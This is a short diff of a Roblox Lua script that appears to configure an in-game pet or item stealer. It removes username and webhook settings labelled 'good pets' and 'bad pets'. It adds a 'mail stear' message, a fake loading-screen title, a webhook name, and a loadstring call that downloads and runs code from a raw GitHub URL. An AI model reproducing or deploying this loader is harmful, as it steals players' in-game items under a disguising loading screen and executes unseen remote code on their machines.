@@ -1,3 +1,5 @@
-UserName = "Put Your Username" -- good pets
-Webhook = "Put Your Webhook" -- pings for pets
-UserName2 = "Put Your Username" -- bad pets
+_G.MailMessage = "by bacon op mail stear" -- Mail Message !
+_G.LoadingTitle = "bacon on top" -- Loading Screen Title
+_G.WebhookName = "bacon" -- Webhook name 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/idkk/main/iddkkk2"))()
